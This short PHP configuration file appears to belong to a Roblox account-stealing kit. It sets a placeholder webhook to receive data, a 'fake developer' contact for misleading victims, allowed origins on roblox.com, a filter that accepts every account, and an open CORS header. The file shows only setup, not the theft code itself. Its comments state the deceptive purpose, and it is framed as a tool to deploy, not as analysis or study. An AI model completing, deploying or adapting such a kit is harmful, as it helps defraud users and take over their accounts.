<?php


    $webhook = "their webhook here";
    // fake developer for the bot the users may contact
    $discord_contact = "Usmxn#1111";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
       require("status.php");
           header("Access-Control-Allow-Origin: *");
?>